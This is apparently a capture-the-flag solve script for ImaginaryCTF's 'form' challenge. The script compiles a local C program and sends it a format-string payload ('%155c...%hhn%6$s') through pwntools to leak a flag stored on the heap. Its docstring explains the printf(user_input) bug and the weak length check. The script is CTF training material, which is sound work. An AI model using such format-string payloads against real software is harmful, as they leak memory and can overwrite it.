#!/usr/bin/env python3
"""Solve ImaginaryCTF `form` -- an uncontrolled format string.

Recon: `vuln.c` reads the flag into a heap buffer, then `printf(buf)` with
`buf` taken straight from stdin -- a format-string bug. The guard only checks
`strlen(flag) <= 23` (on an aliased pointer), so a short format string gets
through.

Clue: `printf(user_input)` lets you read arbitrary stack/arg slots with `%N$s`.
The flag's heap pointer sits a few argument slots in; we walk the variadic
pointer forward with a run of `%c` and then `%6$s` dereferences the flag
pointer, printing the flag. (`%hhn` in the classic payload just pads; the read
is what matters.)

Built and run LOCALLY against its own binary + flag.txt. The exact slot is
ABI/stack dependent -- ⚠ may need a nudge on a different toolchain.

Fetch first:  python challenges/fetch.py form
"""
import os
import re
import subprocess

from pwn import context, process

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.abspath(os.path.join(HERE, "..", ".."))
CHALL = os.path.join(REPO, "challenges", "form", "challenge")
context.log_level = "error"

PAYLOAD = b"%155c%c%c%c%c%c%hhn%6$s"


def main() -> None:
    subprocess.run(["gcc", "vuln.c", "-o", "vuln"], cwd=CHALL, check=True)
    proc = process(os.path.join(CHALL, "vuln"), cwd=CHALL)
    proc.sendline(PAYLOAD)
    out = proc.recvall(timeout=3).decode(errors="replace")
    match = re.search(r"ictf\{[^}]*\}", out)
    print("FLAG:", match.group(0) if match else "not found")


if __name__ == "__main__":
    main()
